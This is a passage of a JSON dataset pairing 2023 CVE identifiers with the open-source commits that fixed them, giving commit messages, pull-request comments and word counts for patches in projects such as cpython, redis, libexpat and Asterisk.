            "pr_title_words": 1,
            "comments_words": 0,
            "total_other_info_words": 1
        },
        {
            "cve-id": "CVE-2023-22745",
            "commit_url": "https://github.com/tpm2-software/tpm2-tss/commit/306490c8d848c367faa2d9df81f5e69dab46ffb5",
            "commit_msg": "tss2_rc: ensure layer number is in bounds\n\nThe layer handler array was defined as 255, the max number of uint8,\nwhich is the size of the layer field, however valid values are 0-255\nallowing for 256 possibilities and thus the array was off by one and\nneeded to be sized to 256 entries. Update the size and add tests.\n\nNote: previous implementations incorrectly dropped bits on unknown error\noutput, ie TSS2_RC of 0xFFFFFF should yeild a string of 255:0xFFFFFF,\nbut earlier implementations returned 255:0xFFFF, dropping the middle\nbits, this patch fixes that.\n\nFixes: CVE-2023-22745\n\nSigned-off-by: William Roberts <william.c.roberts@intel.com>",
            "commit_msg_words": 98,
            "other_info": "Coverity scan",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-5521",
            "commit_url": "https://github.com/tiann/KernelSU/commit/a22959beae1aad96b1f72710a5daadf529c41bda",
            "commit_msg": "kernel: harden the signature check (#1027)",
            "commit_msg_words": 6,
            "other_info": "kernel: harden the signature check https://github.com/tiann/KernelSU/blob/main/userspace/ksud/src/debug.rs#L18\r\nhttps://github.com/tiann/KernelSU/blob/main/userspace/ksud/src/apk_sign.rs#L4\r\nhttps://github.com/tiann/KernelSU/blob/main/kernel/apk_sign.c#L145",
            "pr_title_words": 5,
            "comments_words": 3,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-6507",
            "commit_url": "https://github.com/python/cpython/commit/7a896fc464a6bceb9b95268b0141667645b2a8da",
            "commit_msg": "gh-112334: Restore subprocess's use of `vfork()` & fix `extra_groups=[]`.\n\nFixed a performance regression in 3.12's :mod:`subprocess` on Linux where it\nwould no longer use the fast-path ``vfork()`` system call when it could have\ndue to a logic bug, instead falling back to the safe but slower ``fork()``.\n\nAlso fixed a second 3.12.0 potential security bug.  If a value of\n``extra_groups=[]`` was passed to :mod:`subprocess.Popen` or related APIs,\nthe underlying ``setgroups(0, NULL)`` system call to clear the groups list\nwould not be made in the child process prior to ``exec()``.\n\nThe security issue was identified via code inspection in the process of\nfixing the first bug.  Thanks to @vain for the detailed report and\nanalysis in the initial bug on Github.\n\n * [ ] A regression test is desirable. I'm pondering a test that runs when\n   `strace` is available and permitted which and confirms use of `vfork()`\n   vs `clone()`...",
            "commit_msg_words": 148,
            "other_info": "gh-112334: Restore subprocess's use of `vfork()` & fix `extra_groups=[]` behavior :robot: New build scheduled with the buildbot fleet by @gpshead for commit 84d060f0af01c5e6e3392095e62be621f95704f3 :robot:\n\nIf you want to schedule another build, you need to add the <kbd>:hammer: test-with-buildbots</kbd> label again.\n @gpshead Thank you! FWIW, this fixes my test case. :) :robot: New build scheduled with the buildbot fleet by @serhiy-storchaka for commit ce31462bd308e0fd5e5feb543745396220667656 :robot:\n\nIf you want to schedule another build, you need to add the <kbd>:hammer: test-with-buildbots</kbd> label again.\n Thanks @gpshead for the PR \ud83c\udf2e\ud83c\udf89.. I'm working now to backport this PR to: 3.12.\n\ud83d\udc0d\ud83c\udf52\u26cf\ud83e\udd16  [GH-112731](https://github.com/python/cpython/pull/112731) is a backport of this pull request to the [3.12 branch](https://github.com/python/cpython/tree/3.12). I will add the desired vfork regression test in a followup PR. Merging now to unblock releasing the fix.",
            "pr_title_words": 10,
            "comments_words": 117,
            "total_other_info_words": 127
        },
        {
            "cve-id": "CVE-2023-28629",
            "commit_url": "https://github.com/gocd/gocd/commit/95f758229d419411a38577608709d8552cccf193",
            "commit_msg": "Improve escaping on legacy Freemarker templates",
            "commit_msg_words": 6,
            "other_info": "Improve build label handling",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-30362",
            "commit_url": "https://github.com/obgm/libcoap/commit/e7287de3363bf9cb9ac8c4dd48ce2988be1b080d",
            "commit_msg": "net.c: Fix potential overflow in coap_send_internal()",
            "commit_msg_words": 6,
            "other_info": "net.c: Fix potential overflow in coap_send_internal()",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2023-1428",
            "commit_url": "https://github.com/grpc/grpc/commit/2485fa94bd8a723e5c977d55a3ce10b301b437f8",
            "commit_msg": "[chttp2] Fix fuzzer found bug (#32507)\n\n<!--\r\n\r\nIf you know who should review your pull request, please assign it to\r\nthat\r\nperson, otherwise the pull request would get assigned randomly.\r\n\r\nIf your pull request is for a specific language, please add the\r\nappropriate\r\nlang label.\r\n\r\n-->",
            "commit_msg_words": 46,
            "other_info": "[chttp2] Fix fuzzer found bug",
            "pr_title_words": 5,
            "comments_words": 0,
            "total_other_info_words": 5
        },
        {
            "cve-id": "CVE-2023-48795",
            "commit_url": "https://github.com/hierynomus/sshj/commit/94fcc960e0fb198ddec0f7efc53f95ac627fe083",
            "commit_msg": "Implement OpenSSH strict key exchange extension",
            "commit_msg_words": 6,
            "other_info": "Implement OpenSSH strict key exchange extension Thanks for the PR. It would be great to have some unit and/or integration tests attached! Yes, I still need to find a good approach for them. \ud83d\ude04 \r\n\r\nThe integration tests cover most of the changes automatically, but the interesting bits only if the openssh version is new enough. I'll have a look whether there is a way to test things specifically, e.g. by assertions on the logs. Unit tests that are not too brittle might be harder. ## [Codecov](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=h1&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp) Report\nAttention: `17 lines` in your changes are missing coverage. Please review.\n> Comparison is base [(`50c753d`)](https://app.codecov.io/gh/hierynomus/sshj/commit/50c753dc5801612bec33ff6fa205c3d8a17d854a?el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp) 68.85% compared to head [(`94fcc96`)](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=desc&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp) 68.77%.\n\n| [Files](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp) | Patch % | Lines |\n|---|---|---|\n| [.../java/net/schmizz/sshj/transport/KeyExchanger.java](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp#diff-c3JjL21haW4vamF2YS9uZXQvc2NobWl6ei9zc2hqL3RyYW5zcG9ydC9LZXlFeGNoYW5nZXIuamF2YQ==) | 47.05% | [6 Missing and 3 partials :warning: ](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp) |\n| [...java/net/schmizz/sshj/transport/TransportImpl.java](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp#diff-c3JjL21haW4vamF2YS9uZXQvc2NobWl6ei9zc2hqL3RyYW5zcG9ydC9UcmFuc3BvcnRJbXBsLmphdmE=) | 37.50% | [2 Missing and 3 partials :warning: ](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp) |\n| [...ain/java/net/schmizz/sshj/transport/Converter.java](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp#diff-c3JjL21haW4vamF2YS9uZXQvc2NobWl6ei9zc2hqL3RyYW5zcG9ydC9Db252ZXJ0ZXIuamF2YQ==) | 0.00% | [2 Missing and 1 partial :warning: ](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=tree&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp) |\n\n<details><summary>Additional details and impacted files</summary>\n\n\n```diff\n@@             Coverage Diff              @@\n##             master     #917      +/-   ##\n============================================\n- Coverage     68.85%   68.77%   -0.09%     \n- Complexity     1430     1438       +8     \n============================================\n  Files           208      208              \n  Lines          7574     7602      +28     \n  Branches        651      658       +7     \n============================================\n+ Hits           5215     5228      +13     \n- Misses         2012     2019       +7     \n- Partials        347      355       +8     \n```\n\n\n\n</details>\n\n[:umbrella: View full report in Codecov by Sentry](https://app.codecov.io/gh/hierynomus/sshj/pull/917?src=pr&el=continue&utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp).   \n:loudspeaker: Have feedback on the report? [Share it here](https://about.codecov.io/codecov-pr-comment-feedback/?utm_medium=referral&utm_source=github&utm_content=comment&utm_campaign=pr+comments&utm_term=Jeroen+van+Erp).\n I updated the alpine base image for the integration tests to 3.19.0 so that they now use OpenSSH 9.6. I also added an integration test that makes specific assertions on the logs. Great work! I'm going to merge it.",
            "pr_title_words": 6,
            "comments_words": 263,
            "total_other_info_words": 269
        },
        {
            "cve-id": "CVE-2023-40315",
            "commit_url": "https://github.com/OpenNMS/opennms/commit/201301e067329ababa3c0671ded5c4c43347d4a8",
            "commit_msg": "NMS-15702: Only members of ROLE_ADMIN can view/edit users.xml",
            "commit_msg_words": 8,
            "other_info": "NMS-15702: Only members of ROLE_ADMIN can view/edit users.xml",
            "pr_title_words": 8,
            "comments_words": 0,
            "total_other_info_words": 8
        },
        {
            "cve-id": "CVE-2023-47324",
            "commit_url": "https://github.com/Silverpeas/Silverpeas-Core/commit/9a55728729a3b431847045c674b3e883507d1e1a",
            "commit_msg": "Bug #13811: fixing stored XSS leading to full account takeover\n\n* making HTML sanitize processing accessible for JSTL instructions\n* sanitizing user notification title and contents on registering\n* sanitizing user notification title and contents on rendering\n* sanitizing browse bar parts\n* modifying the user and group saving action names in order to get the user token verifications\n* applying the token validation from component request router abstraction",
            "commit_msg_words": 69,
            "other_info": "Bug #13811: fixing technical problem Kudos, SonarCloud Quality Gate passed!&nbsp; &nbsp; [![Quality Gate passed](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/QualityGateBadge/passed-16px.png 'Quality Gate passed')](https://sonarcloud.io/dashboard?id=Silverpeas_Silverpeas-Core2&pullRequest=1298)\n\n[![Bug](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/bug-16px.png 'Bug')](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=BUG) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=BUG) [0 Bugs](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=BUG)  \n[![Vulnerability](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/vulnerability-16px.png 'Vulnerability')](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=VULNERABILITY) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=VULNERABILITY) [0 Vulnerabilities](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=VULNERABILITY)  \n[![Security Hotspot](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/security_hotspot-16px.png 'Security Hotspot')](https://sonarcloud.io/project/security_hotspots?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=SECURITY_HOTSPOT) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/security_hotspots?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=SECURITY_HOTSPOT) [0 Security Hotspots](https://sonarcloud.io/project/security_hotspots?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=SECURITY_HOTSPOT)  \n[![Code Smell](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/code_smell-16px.png 'Code Smell')](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=CODE_SMELL) [![A](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/RatingBadge/A-16px.png 'A')](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=CODE_SMELL) [0 Code Smells](https://sonarcloud.io/project/issues?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&resolved=false&types=CODE_SMELL)\n\n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/CoverageChart/0-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&metric=new_coverage&view=list) [0.0% Coverage](https://sonarcloud.io/component_measures?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&metric=new_coverage&view=list)  \n[![0.0%](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/checks/Duplications/3-16px.png '0.0%')](https://sonarcloud.io/component_measures?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&metric=new_duplicated_lines_density&view=list) [0.0% Duplication](https://sonarcloud.io/component_measures?id=Silverpeas_Silverpeas-Core2&pullRequest=1298&metric=new_duplicated_lines_density&view=list)\n\n![warning](https://sonarsource.github.io/sonarcloud-github-static-resources/v2/common/message_warning-16px.png 'warning') The version of Java (11.0.15) you have used to run this analysis is deprecated and we will stop accepting it soon. Please update to at least Java 17.\nRead more [here](https://docs.sonarcloud.io/appendices/scanner-environment/)",
            "pr_title_words": 5,
            "comments_words": 83,
            "total_other_info_words": 88
        },
        {
            "cve-id": "CVE-2023-2905",
            "commit_url": "https://github.com/cesanta/mongoose/commit/aed7b6b37ae189680dce9f5d444c90b4dc8df7a2",
            "commit_msg": "fixed mqtt variable length header issue",
            "commit_msg_words": 6,
            "other_info": "fixed mqtt variable length header issue",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2023-26257",
            "commit_url": "https://github.com/COVESA/dlt-daemon/commit/b6149e203f919c899fefc702a17fbb78bdec3700",
            "commit_msg": "Fix memory leak\n\nFree the ecuid_conf in case of memory alllocated\n\nSigned-off-by: Le Van Khanh <Khanh.LeVan@vn.bosch.com>",
            "commit_msg_words": 16,
            "other_info": "Fix memory leak @lvklevankhanh \r\nIt's really good. The patch worked fine.",
            "pr_title_words": 3,
            "comments_words": 8,
            "total_other_info_words": 11
        },
        {
            "cve-id": "CVE-2023-0872",
            "commit_url": "https://github.com/OpenNMS/opennms/commit/34ab169a74b2bc489ab06d0dbf33fee1ed94c93c",
            "commit_msg": "NMS-15703: Do not allow ROLE_REST to modify users",
            "commit_msg_words": 8,
            "other_info": "NMS-15703: Do not allow ROLE_REST to modify users > looks fine but this should go back to _at least_ `foundation-2023`, ideally `foundation-2019` if it still applies there (probably will)\r\n\r\nwow: rebased across 11180 commits.",
            "pr_title_words": 8,
            "comments_words": 26,
            "total_other_info_words": 34
        },
        {
            "cve-id": "CVE-2023-28630",
            "commit_url": "https://github.com/gocd/gocd/commit/6545481e7b36817dd6033bf614585a8db242070d",
            "commit_msg": "Improve error messages on failure to launch backup process\n\nztexec can include env vars in the error message which we don't want in this case.",
            "commit_msg_words": 25,
            "other_info": "Improve error messages on failure to launch DB backup process",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2023-5349",
            "commit_url": "https://github.com/rmagick/rmagick/commit/da823515a13130010f74678dc48f8b08a70cbd14",
            "commit_msg": "Fix memory leak in `Magick::Draw` for recentry ImageMagick 6 by removing unnecessary `GetDrawInfo()` calling",
            "commit_msg_words": 14,
            "other_info": "Fix memory leak in `Magick::Draw` for recentry ImageMagick 6 by removing unnecessary `GetDrawInfo()` calling Thanks! Asked for a CVE Will give you the number ASAP For reference it is CVE-2023-5349.",
            "pr_title_words": 14,
            "comments_words": 16,
            "total_other_info_words": 30
        },
        {
            "cve-id": "CVE-2023-31129",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/c23cf7a16289afe716ae023c664ded16e88efd2d",
            "commit_msg": "fix rs_input missing NULL pointer check",
            "commit_msg_words": 6,
            "other_info": "fix rs_input missing NULL pointer check",
            "pr_title_words": 6,
            "comments_words": 0,
            "total_other_info_words": 6
        },
        {
            "cve-id": "CVE-2023-25827",
            "commit_url": "https://github.com/OpenTSDB/opentsdb/commit/ff02c1e95e60528275f69b31bcbf7b2ac625cea8",
            "commit_msg": "Fix for #2269 and #2267 XSS vulnerability.\nEscaping the user supplied input when outputing the HTML for the old BadRequest\nHTML handlers should help. Thanks to the reporters.\nFixes CVE-2018-13003.",
            "commit_msg_words": 30,
            "other_info": "Fix for #2269 and #2267 XSS vulnerability.",
            "pr_title_words": 7,
            "comments_words": 0,
            "total_other_info_words": 7
        },
        {
            "cve-id": "CVE-2023-41053",
            "commit_url": "https://github.com/redis/redis/commit/9e505e6cd842338424e05883521ca1fb7d0f47f6",
            "commit_msg": "Fix sort_ro get-keys function return wrong key number (#12522)\n\nBefore\uff1a\n```\n127.0.0.1:6379> command getkeys sort_ro key\n(empty array)\n127.0.0.1:6379>\n```\nAfter:\n```\n127.0.0.1:6379> command getkeys sort_ro key\n1) \"key\"\n127.0.0.1:6379>\n```\n\n(cherry picked from commit b59f53efb31b36d0a307809f5d33bf66d66a4447)",
            "commit_msg_words": 36,
            "other_info": "Redis 7.2.1",
            "pr_title_words": 2,
            "comments_words": 0,
            "total_other_info_words": 2
        },
        {
            "cve-id": "CVE-2023-47625",
            "commit_url": "https://github.com/PX4/PX4-Autopilot/commit/d1fcd39a44e6312582c6ab02b0d5ee2599fb55aa",
            "commit_msg": "fix crsf_rc: prevent potential buffer overflow for unknown packets\n\nThe length check for unknown packets did not include PACKET_SIZE_TYPE_SIZE\nand CRC_SIZE, and hence working_index could overflow CRSF_MAX_PACKET_LEN,\ntriggering invalid memory access further down in QueueBuffer_PeekBuffer.\n\nAlso the working_segment_size was wrong for unknown packets.\n\nCredits for finding this go to @Pwn9uin.",
            "commit_msg_words": 50,
            "other_info": "fix crsf_rc: prevent potential buffer overflow for unknown packets Nice find. Can't believe I messed that up. LGTM",
            "pr_title_words": 9,
            "comments_words": 9,
            "total_other_info_words": 18
        },
        {
            "cve-id": "CVE-2023-49294",
            "commit_url": "https://github.com/asterisk/asterisk/commit/424be345639d75c6cb7d0bd2da5f0f407dbd0bd5",
            "commit_msg": "manager.c: Prevent path traversal with GetConfig.\n\nWhen using AMI GetConfig, it was possible to access files outside of the\nAsterisk configuration directory by using filenames with \"..\" and \"./\"\neven while live_dangerously was not enabled. This change resolves the\nfull path and ensures we are still in the configuration directory before\nattempting to access the file.",
            "commit_msg_words": 56,
            "other_info": "manager.c: Prevent path traversal with GetConfig. cherry-pick-to: 18\r\ncherry-pick-to: 20\r\ncherry-pick-to: 21\r\ncherry-pick-to: certified/18.9 cherry-pick-test Successfully merged to branch master and cherry-picked to [\"18\",\"20\",\"21\",\"certified/18.9\"]",
            "pr_title_words": 6,
            "comments_words": 18,
            "total_other_info_words": 24
        },
        {
            "cve-id": "CVE-2023-31127",
            "commit_url": "https://github.com/DMTF/libspdm/commit/8426a309c1de246ac13012246e44b6249a43d081",
            "commit_msg": "Add handshake mode switch check in FINISH and PSK_FINISH.\n\nReference: DMTF-2023-0001\n\nFix: https://github.com/DMTF/libspdm/issues/2005\n\nSigned-off-by: Jiewen Yao <jiewen.yao@intel.com>",
            "commit_msg_words": 17,
            "other_info": "Add handshake mode switch check in FINISH and PSK_FINISH.",
            "pr_title_words": 9,
            "comments_words": 0,
            "total_other_info_words": 9
        },
        {
            "cve-id": "CVE-2023-23108",
            "commit_url": "https://github.com/colinbourassa/crasm/commit/c7a4d332b426a25478afd3118f3be5af37972edd",
            "commit_msg": "Prevent division by zero.\n\nUnder specific test cases, the application could crash with a\nfloating point exception.",
            "commit_msg_words": 17,
            "other_info": "Fix two faulting cases",
            "pr_title_words": 4,
            "comments_words": 0,
            "total_other_info_words": 4
        },
        {
            "cve-id": "CVE-2023-26253",
            "commit_url": "https://github.com/gluster/glusterfs/commit/2b501045c65cf2ecc660b81ef019ce6552085982",
            "commit_msg": "fuse: Resolve reviewer comment\n\nFixes: #3954\nChange-Id: I6b2869256b26d22163879737dcf163510d1cd8bf\nSigned-off-by: Mohit Agrawal <moagrawa@redhat.com>",
            "commit_msg_words": 12,
            "other_info": "fuse: Resolve asan bug in during receive event notification /run regression CLANG-FORMAT FAILURE:\nBefore merging the patch, this diff needs to be considered for passing clang-format\n\n```diff --git a/xlators/mount/fuse/src/fuse-bridge.c b/xlators/mount/fuse/src/fuse-bridge.c\nindex a9ffbc06e..c88e0087e 100644\n--- a/xlators/mount/fuse/src/fuse-bridge.c\n+++ b/xlators/mount/fuse/src/fuse-bridge.c\n@@ -6352,7 +6352,8 @@ fuse_priv_dump(xlator_t *this)\n     if (!this)\n         return -1;\n \n-    private = this->private;\n+   private\n+    = this->private;\n \n     if (!private)\n         return -1;\n@@ -6506,7 +6507,8 @@ notify(xlator_t *this, int32_t event, void *data, ...)\n     glusterfs_graph_t *graph = NULL;\n     struct pollfd pfd = {0};\n \n-    private = this->private;\n+   private\n+    = this->private;\n \n     graph = data;\n \n@@ -6528,7 +6530,8 @@ notify(xlator_t *this, int32_t event, void *data, ...)\n                 (event == GF_EVENT_CHILD_DOWN)) {\n                 pthread_mutex_lock(&private->sync_mutex);\n                 {\n-                    private->event_recvd = 1;\n+                   private\n+                    ->event_recvd = 1;\n                     pthread_cond_broadcast(&private->sync_cond);\n                 }\n                 pthread_mutex_unlock(&private->sync_mutex);\n@@ -6537,16 +6540,18 @@ notify(xlator_t *this, int32_t event, void *data, ...)\n             pthread_mutex_lock(&private->sync_mutex);\n             {\n                 if (!private->fuse_thread_started) {\n-                    private->fuse_thread_started = 1;\n+                   private\n+                    ->fuse_thread_started = 1;\n                     start_thread = _gf_true;\n                 }\n             }\n             pthread_mutex_unlock(&private->sync_mutex);\n \n             if (start_thread) {\n-                private->fuse_thread = GF_CALLOC(private->reader_thread_count,\n-                                                 sizeof(pthread_t),\n-                                                 gf_fuse_mt_pthread_t);\n+               private\n+                ->fuse_thread = GF_CALLOC(private->reader_thread_count,\n+                                          sizeof(pthread_t),\n+                                          gf_fuse_mt_pthread_t);\n                 for (i = 0; i < private->reader_thread_count; i++) {\n                     ret = gf_thread_create(&private->fuse_thread[i], NULL,\n                                            fuse_thread_proc, this, \"fuseproc\");\n@@ -6580,7 +6585,8 @@ notify(xlator_t *this, int32_t event, void *data, ...)\n                         if (fuse_get_mount_status(this) != 0) {\n                             goto auth_fail_unlock;\n                         }\n-                        private->mount_finished = _gf_true;\n+                       private\n+                        ->mount_finished = _gf_true;\n                     } else if (pfd.revents) {\n                         gf_log(this->name, GF_LOG_ERROR,\n                                \"mount pipe closed without status\");\n``` /run regression CLANG-FORMAT FAILURE:\nBefore merging the patch, this diff needs to be considered for passing clang-format\n\n```diff --git a/xlators/mount/fuse/src/fuse-bridge.c b/xlators/mount/fuse/src/fuse-bridge.c\nindex 2dc9b4f42..c96b85c45 100644\n--- a/xlators/mount/fuse/src/fuse-bridge.c\n+++ b/xlators/mount/fuse/src/fuse-bridge.c\n@@ -6352,7 +6352,8 @@ fuse_priv_dump(xlator_t *this)\n     if (!this)\n         return -1;\n \n-    private = this->private;\n+   private\n+    = this->private;\n \n     if (!private)\n         return -1;\n@@ -6506,7 +6507,8 @@ notify(xlator_t *this, int32_t event, void *data, ...)\n     glusterfs_graph_t *graph = NULL;\n     struct pollfd pfd = {0};\n \n-    private = this->private;\n+   private\n+    = this->private;\n \n     graph = data;\n \n@@ -6528,7 +6530,8 @@ notify(xlator_t *this, int32_t event, void *data, ...)\n                 (event == GF_EVENT_CHILD_DOWN)) {\n                 pthread_mutex_lock(&private->sync_mutex);\n                 {\n-                    private->event_recvd = 1;\n+                   private\n+                    ->event_recvd = 1;\n                     pthread_cond_broadcast(&private->sync_cond);\n                 }\n                 pthread_mutex_unlock(&private->sync_mutex);\n@@ -6537,16 +6540,18 @@ notify(xlator_t *this, int32_t event, void *data, ...)\n             pthread_mutex_lock(&private->sync_mutex);\n             {\n                 if (!private->fuse_thread_started) {\n-                    private->fuse_thread_started = 1;\n+                   private\n+                    ->fuse_thread_started = 1;\n                     start_thread = _gf_true;\n                 }\n             }\n             pthread_mutex_unlock(&private->sync_mutex);\n \n             if (start_thread) {\n-                private->fuse_thread = GF_CALLOC(private->reader_thread_count,\n-                                                 sizeof(pthread_t),\n-                                                 gf_fuse_mt_pthread_t);\n+               private\n+                ->fuse_thread = GF_CALLOC(private->reader_thread_count,\n+                                          sizeof(pthread_t),\n+                                          gf_fuse_mt_pthread_t);\n                 for (i = 0; i < private->reader_thread_count; i++) {\n                     ret = gf_thread_create(&private->fuse_thread[i], NULL,\n                                            fuse_thread_proc, this, \"fuseproc\");\n@@ -6580,7 +6585,8 @@ notify(xlator_t *this, int32_t event, void *data, ...)\n                         if (fuse_get_mount_status(this) != 0) {\n                             goto auth_fail_unlock;\n                         }\n-                        private->mount_finished = _gf_true;\n+                       private\n+                        ->mount_finished = _gf_true;\n                     } else if (pfd.revents) {\n                         gf_log(this->name, GF_LOG_ERROR,\n                                \"mount pipe closed without status\");\n```",
            "pr_title_words": 9,
            "comments_words": 448,
            "total_other_info_words": 457
        },
        {
            "cve-id": "CVE-2023-31975",
            "commit_url": "https://github.com/yasm/yasm/commit/168febbc155c832439be9500452ebe39994d2309",
            "commit_msg": "fix issue #210",
            "commit_msg_words": 3,
            "other_info": "fix issue #210",
            "pr_title_words": 3,
            "comments_words": 0,
            "total_other_info_words": 3
        },
        {
            "cve-id": "CVE-2023-23609",
            "commit_url": "https://github.com/contiki-ng/contiki-ng/commit/20ae1a06f2fa13acfba43da73adb71dc61fcef84",
            "commit_msg": "Check remaining space in the packetbuf before writing to it in input_l2cap_frame_flow_channel().",
            "commit_msg_words": 12,
            "other_info": "Check available packetbuf space before writing to it in ble-l2cap",
            "pr_title_words": 10,
            "comments_words": 0,
            "total_other_info_words": 10
        },
        {
            "cve-id": "CVE-2023-29383",
            "commit_url": "https://github.com/shadow-maint/shadow/commit/e5905c4b84d4fb90aefcd96ee618411ebfac663d",
            "commit_msg": "Added control character check\n\nAdded control character check, returning -1 (to \"err\") if control characters are present.",
            "commit_msg_words": 17,
            "other_info": "Control character check You have successfully added a new shellcheck configuration `differential-shellcheck`. As part of the setup process, we have scanned this repository and found no existing alerts. In the future, you will see all code scanning alerts on the repository [Security tab](/shadow-maint/shadow/security/code-scanning?query=pr%3A687+tool%3Ashellcheck+is%3Aopen). @hallyn what do we do with the failing test case? > @hallyn what do we do with the failing test case?\r\n\r\nI'll have to look into it this hopefully tonight, else this weekend. I'll look at the others you mentioned too. Oh - I see, it fails in your doc-only pr too.  Let's just merge then.",
            "pr_title_words": 3,
            "comments_words": 96,
            "total_other_info_words": 99
        },
        {
            "cve-id": "CVE-2023-52426",
            "commit_url": "https://github.com/libexpat/libexpat/commit/0f075ec8ecb5e43f8fdca5182f8cca4703da0404",
            "commit_msg": "lib|xmlwf|cmake: Extend scope of billion laughs attack protection\n\n.. from \"defined(XML_DTD)\" to \"defined(XML_DTD) || XML_GE==1\".",
            "commit_msg_words": 15,
            "other_info": "[CVE-2023-52426] Fix issues for compilation with XML_DTD undefined @Snild-Sony many thanks for the review! :pray:  Hi @hartwork,\r\nDoes this CVE affect expat-2.2.9? In NVD it's mentioned as it affects everything before 2.6.0.\r\nCan you please let me know.\r\n\r\nI checked: https://security-tracker.debian.org/tracker/CVE-2023-52426\r\n\r\nIn this commit, https://github.com/libexpat/libexpat/commit/0f075ec8ecb5e43f8fdca5182f8cca4703da0404\r\n\r\nFor example (snippet from above commit):\r\n\r\n```\r\n-#ifndef XML_DTD\r\n-      ftprintf(stderr, T(\"Warning: Given attack threshold ignored\") T(\r\n-                           \", xmlwf has been compiled without DTD support.\\n\"));\r\n+#if ! defined(XML_DTD) && XML_GE == 0\r\n+      ftprintf(stderr,\r\n+               T(\"Warning: Given attack threshold ignored\")\r\n+                   T(\", xmlwf has been compiled without DTD/GE support.\\n\"));\r\n #endif\r\n```\r\n\r\nThe remove portion of this code is not present in 2.2.9. @sshedi please open a dedicated ticket for questions like that, next time :pray: \r\n\r\n> Hi @hartwork, Does this CVE affect expat-2.2.9? In NVD it's mentioned as it affects everything before 2.6.0. Can you please let me know.\r\n\r\nYes, all prior releases are vulnerable.\r\n\r\n\r\n> I checked: https://security-tracker.debian.org/tracker/CVE-2023-52426\r\n> \r\n> In this commit, [0f075ec](https://github.com/libexpat/libexpat/commit/0f075ec8ecb5e43f8fdca5182f8cca4703da0404)\r\n> \r\n> For example (snippet from above commit):\r\n> \r\n> ```diff\r\n> -#ifndef XML_DTD\r\n> -      ftprintf(stderr, T(\"Warning: Given attack threshold ignored\") T(\r\n> -                           \", xmlwf has been compiled without DTD support.\\n\"));\r\n> +#if ! defined(XML_DTD) && XML_GE == 0\r\n> +      ftprintf(stderr,\r\n> +               T(\"Warning: Given attack 